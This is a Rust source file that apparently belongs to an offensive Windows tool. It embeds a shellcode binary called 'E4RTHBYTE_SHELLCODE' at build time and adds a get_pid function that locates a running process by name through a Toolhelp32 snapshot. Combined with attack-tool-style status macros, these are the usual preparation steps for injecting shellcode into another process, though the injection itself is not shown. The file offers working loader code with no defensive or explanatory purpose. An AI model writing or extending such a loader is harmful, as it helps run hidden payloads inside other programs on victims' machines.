use std::ffi::CStr;
use std::mem::zeroed;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Diagnostics::ToolHelp::{CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS};

pub const E4RTHBYTE_SHELLCODE: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/e4rthbyte_shellcode.bin"));

#[macro_export]
macro_rules! msg {
    ($($arg:tt)*) => {{
        let msg = format!($($arg)*);
        println!("[+] {}", msg);
    }};
}

#[macro_export]
macro_rules! error {
    ($($arg:tt)*) => {{
        let msg = format!($($arg)*);
        println!("[-] {}, exiting in 3s", msg);
        std::thread::sleep(std::time::Duration::from_secs(3));
        std::process::exit(1);
    }};
}

pub fn get_pid<S>(process: S) -> Option<u32>
where 
    S: AsRef<str>
{
    unsafe {
        let Ok(h_snapshot) = CreateToolhelp32Snapshot(
            TH32CS_SNAPPROCESS,
            0
        ) else {
            return None
        };

        let mut pe = PROCESSENTRY32 {
            dwSize: size_of::<PROCESSENTRY32>() as _,
            ..zeroed()
        };

        let mut success = Process32First(h_snapshot, &mut pe);

        while success.is_ok() {
            let exe_name = CStr::from_ptr(pe.szExeFile.as_ptr())
                .to_string_lossy();

            if exe_name.eq_ignore_ascii_case(process.as_ref()) {
                let _ = CloseHandle(h_snapshot);
                return Some(pe.th32ProcessID);
            }

            success = Process32Next(h_snapshot, &mut pe);
        }

        let _ = CloseHandle(h_snapshot);

        None
    }
}